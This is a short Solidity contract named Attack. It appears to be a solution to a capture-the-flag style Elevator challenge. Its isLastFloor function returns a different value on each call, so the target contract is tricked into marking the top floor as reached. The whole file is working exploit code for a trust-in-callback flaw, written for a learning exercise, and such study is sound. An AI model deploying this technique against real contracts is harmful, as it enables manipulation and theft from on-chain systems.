// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Elevator.sol";

contract Attack {
    bool toodle = true; 
     Elevator public target; 

    constructor(address _target) {
        target = Elevator(_target);
    }
    // Write the logic of the buliding last floor 
    function isLastFloor(uint256) external returns(bool) {
        // let it returns true, as toodle = true; 
        // we need !! 
        toodle = !toodle;
        
        return toodle;

    }
    // Write the logic of the go to last floor
    function attack(uint floor ) external {

        target.goTo(floor);
        


    }

}
